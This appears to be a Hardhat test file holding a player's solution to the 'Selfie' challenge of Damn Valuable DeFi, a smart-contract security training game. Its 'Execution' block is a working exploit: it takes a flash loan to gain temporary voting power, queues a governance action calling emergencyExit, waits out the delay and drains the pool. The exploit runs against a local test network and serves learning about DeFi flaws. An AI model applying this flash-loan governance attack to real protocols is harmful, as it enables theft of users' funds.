const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    it('Execution', async function () {
        /**
         * Step 1: Deploy attack contract & build the attack data callback
         */
        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(
            token.address,
            governance.address
        );

        const callData = pool.interface.encodeFunctionData("emergencyExit", [player.address]);
        console.log(`\nCalldata: ${callData}\n`);

        /**
         * Step 2: Use the max flash loan to get enough tokens to be able to submit a governance proposal.
         *  That proposal will be to transfer all of the tokens to our address
         */

        const _receiver = attacker.address;
        const _token = token.address;
        const _amount = await pool.maxFlashLoan(_token);
        console.log(`Flash Loan with data:\n\tReceiver: ${_receiver}\n\tToken: ${_token}\n\tAmount: ${_amount}\n\tData: ${callData}\n`);
        await (await pool.connect(player).flashLoan(_receiver, _token, _amount, callData)).wait();
        const actionId = await attacker.queuedActionId();
        console.log(`Loan Completed. Queued Action ID: ${actionId}\n`);

        /**
         * Step 3: make 2 days pass by to allow for the governance time to elapse
         */

        await time.increase(60*60*24*2);

        /**
         * Step 4: Execute governance action -- should drain the contract to the player wallet
         */

        await (await governance.connect(player).executeAction(actionId)).wait();
        console.log(`Pool Balance: ${await token.balanceOf(pool.address)}`);
        console.log(`Player Balance: ${await token.balanceOf(player.address)}`);
        console.log(': )')
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});